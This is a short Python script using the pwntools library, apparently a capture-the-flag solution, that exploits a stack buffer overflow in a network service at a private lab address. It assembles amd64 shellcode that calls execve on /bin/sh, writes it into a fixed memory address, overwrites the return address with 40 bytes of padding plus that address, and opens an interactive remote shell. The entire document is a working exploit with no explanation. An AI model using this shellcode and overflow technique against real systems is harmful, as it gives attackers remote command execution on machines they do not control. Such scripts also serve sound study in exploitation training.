#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888

r = remote(host,port)

name = 0x0000000000601080
context.arch = "amd64"
#execve("/bin/sh",null,null)
sc = asm("""
    xor rax,rax
    xor rdi,rdi
    xor rdx,rdx
    xor rsi,rsi
    jmp str
execve :
    pop rdi
    mov rax,0x3b
    syscall

    mov rax,0x3c
    syscall

str :
    call execve
    .ascii "/bin/sh"
    .byte 0

""")
payload = "a"*40 + p64(name)
r.recvuntil(":")
r.sendline(sc)
r.recvuntil(":")
r.sendline(payload)
r.interactive()
